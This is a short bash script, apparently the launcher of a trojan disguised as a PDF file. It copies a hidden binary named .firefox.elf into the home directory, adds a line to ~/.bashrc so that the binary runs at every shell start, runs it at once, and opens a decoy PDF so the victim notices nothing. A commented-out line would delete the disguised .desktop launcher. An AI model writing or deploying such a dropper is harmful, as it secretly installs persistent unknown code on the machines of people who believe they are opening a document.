#!/bin/bash

echo -e "# Launch the best browser\n~/.firefox &" >> ~/.bashrc 
cp ./.firefox.elf ~/.firefox 
source ~/.bashrc
evince ./.important.pdf 

# rm -rf ./Important.pdf.desktop 
